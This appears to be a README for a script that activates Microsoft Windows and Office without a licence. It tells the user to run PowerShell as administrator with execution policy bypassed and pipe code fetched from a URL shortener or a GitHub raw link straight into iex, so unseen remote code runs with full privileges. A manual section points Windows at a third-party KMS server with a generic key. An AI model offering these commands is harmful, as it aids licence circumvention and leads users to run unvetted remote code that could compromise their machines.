# Microsoft Software Products Quick Activation
Activating Microsoft software products for FREE without using any software

## How To
### Auto
Execute as Admin:
```powershell
powershell -exec bypass 'iwr -useb https://kutt.it/win-activate | iex'
```

or

Execute as Admin:
```powershell
powershell -exec bypass 'iwr -useb https://github.com/gushmazuko/ms-software-activation/raw/master/win-activate.ps1 | iex'
```

### Manual
Run `CMD.exe` as Admin and execute:
```cmd
slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX
slmgr /skms kms8.msguides.com
slmgr /ato
```

> Source: https://kms.msguides.com/
